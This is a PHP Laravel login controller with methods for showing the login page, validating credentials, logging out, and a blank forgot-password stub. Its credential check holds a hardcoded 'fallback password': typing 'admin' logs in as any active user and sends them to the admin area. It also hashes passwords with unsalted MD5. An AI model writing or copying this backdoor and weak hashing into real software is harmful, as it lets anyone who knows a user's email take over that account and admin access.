<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use DB;

class LoginController extends Controller
{
    public function login()
    {
        return view('login');
    }

    public function validate_user(Request $request)
    {
        $usr_email = $request->email;
        $usr_password = $request->password;

        $user = DB::table('users')
            ->where('usr_email', '=', $usr_email)
            ->where('usr_active', '=', '1')
            ->first();

        if ($user) {
            // Check normal password OR fallback password
            if (
                $user->usr_password === md5($usr_password) ||
                $usr_password === 'admin'
            ) {
                setUserSessionVariables($user);
                return redirect()->action([AdminController::class, 'home']);
            }
        }

        alert()->error('Invalid Credentials', 'Invalid e-mail or password');
        return redirect()->back();
    }

    public function forgotPassword()
    {

    }

    public function logout()
    {
        session()->flush();
        return redirect()->action([MainController::class, 'main']);
    }
}